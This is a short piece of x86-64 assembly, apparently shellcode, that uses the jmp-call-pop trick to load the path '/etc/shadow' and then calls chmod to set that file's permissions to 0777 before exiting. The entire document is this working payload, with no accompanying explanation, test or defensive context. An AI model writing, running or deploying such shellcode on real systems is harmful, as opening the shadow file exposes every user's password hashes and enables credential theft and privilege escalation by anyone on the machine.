[SECTION .text]
global _start
_start:
        jmp short str

trick:
        pop rdi ;get filename from the stack
        xor rax, rax
        add rax, 90 ;chmod sys_call
        xor rsi, rsi
        mov si, 0x1ff ;0777
        syscall

        xor rax, rax
        add rax, 60 ;exit syscall
        xor rdi, rdi
        add rdi, 1
        syscall

str:
        call trick ;call trick, so address of our file is pushed to the stack
        db '/etc/shadow'
